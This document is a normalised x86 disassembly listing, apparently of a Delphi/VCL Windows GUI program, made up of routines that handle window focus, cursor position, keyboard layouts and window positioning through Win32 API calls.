mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4418a8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_445e0c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4619bc
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff34
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_446c6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_446d4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d52
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_448484
mov dl [ ebx + 0x184 ]
call sub_44cfb8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45feac
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408800
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fcac
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fcac
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fcac
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_446d58
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_446de2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446de9
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45feac
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408800
test eax eax
je r-xdata
mov eax ebx
call sub_448484
mov dl 0x1
call sub_44cf9c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_446e44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_414b54
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_442f30
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_446e94
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_446ec8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4038bc
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4038bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_446f08
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_442f30
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_446f60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41e6ac
mov edx [ r-xdata ]
call sub_403870
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_446f98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4161a0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446fbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_448484
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_447018
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_446f84
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4161a0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_447058
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4061ac
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4061ac
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_4470c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44716c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447173
lea eax [ ebp - 0x4 ]
call sub_406194
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43fa28
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4036c0
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_406194
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4038bc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4061ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ edi + 0x178 ] eax
sub_44717c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_444dec
xor edx edx
push ebp
push sub_44723e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4038bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447245
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_447245
mov eax [ ebp - 0x4 ]
call sub_4592cc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_441fc4
sub_447290
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403608
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443bf4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4472fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_441fc4
sub_447314
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44733c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4592cc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4591b4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4038bc
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44733c
test al al
jne r-xdata
sub_4473a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44733c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4473c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44733c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4473e4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44740c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4592cc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4591b4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4038bc
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44740c
test al al
jne r-xdata
sub_447474
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44740c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447494
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44740c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4474d4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4592cc
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4038bc
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4474d4
test al al
jne r-xdata
sub_447538
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4474d4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447558
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445248
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_442f30
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_447558
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_447608
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_447558
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4592cc
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_442f30
test eax eax
jne r-xdata
sub_4476b0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4476d0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4461a0
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447704
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4461a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447724
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_447774
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_447798
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_441030
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_445284
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_445248
mov dl [ esp ]
mov si 0xffd1
call sub_4038bc
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4477f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4038bc
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_447814
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4038bc
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44784c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443a08
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_4452e4
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_445ac0
sub_447884
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4038bc
pop esi
pop ebx
retn
mov eax ebx
call sub_4423c0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4048dc
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4048dc
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_447904
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ea0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_443adc
sub_447964
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_445c14
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_445044
pop ebx
retn
sub_447994
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_4479bc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_445044
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_447a2c
push ebx
mov ebx eax
mov eax ebx
call sub_443948
mov eax ebx
call sub_448788
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_4452e4
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_421528
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_442f30
sub_447a68
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_440610
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_448484
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_442f30
sub_447aa8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_448788
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_448484
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447ae8
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_4452e4
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_44838c
sub_447b28
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_4485c4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_4485c4
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_447b88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44298c
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4418a8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_445e0c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_447bf8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443a80
mov edx esi
mov eax ebx
call sub_4452a4
pop esi
pop ebx
retn
sub_447c14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43ecb4
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4592cc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4038bc
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4038bc
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4038bc
test al al
jne r-xdata
sub_447ca8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_447c14
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_442f30
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_442f30
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_442f30
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4592cc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_442f30
test eax eax
jne r-xdata
jmp r-xdata
sub_447d80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_442f30
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_447dd4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_442f30
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
